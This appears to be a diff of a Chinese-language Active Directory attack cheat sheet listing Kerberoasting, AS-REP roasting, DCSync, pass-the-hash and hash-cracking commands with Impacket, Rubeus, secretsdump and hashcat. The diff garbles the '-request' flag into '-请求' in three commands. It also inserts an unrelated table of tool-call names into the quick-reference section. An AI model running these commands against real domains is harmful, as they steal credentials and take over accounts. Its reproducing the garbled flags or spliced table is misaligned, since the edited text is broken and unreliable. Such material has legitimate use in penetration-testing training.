@@ -128,7 +128,7 @@ crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
 
 ```bash
 # Impacket
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
+GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -请求 -outputfile hashes.txt
 
 # Rubeus
 .\Rubeus.exe kerberoast /outfile:hashes.txt
@@ -308,10 +308,17 @@ python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 ---
 
 ## 快速参考
+| 操作 | 方法 |
+|---|---|
+| 发现工具 | 调用 `RUBE_SEARCH_TOOLS` |
+| 检查连接 | 调用 `RUBE_MANAGE_CONNECTIONS` |
+| 执行工具 | 调用 `RUBE_MULTI_EXECUTE_TOOL` |
+| 处理分页 | 检查响应中的 `cursor` 字段 |
+| 错误处理 | 验证连接状态和架构合规性 |
 
 | 攻击 | 工具 | 命令 |
 |--------|------|---------|
-| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
+| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -请求` |
 | AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
 | DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
 | Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
@@ -348,7 +355,7 @@ python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10
 
 # 2. 请求 TGS 票据
-GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
+GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -请求 -outputfile tgs.txt
 
 # 3. 破解票据
 hashcat -m 13100 tgs.txt rockyou.txt
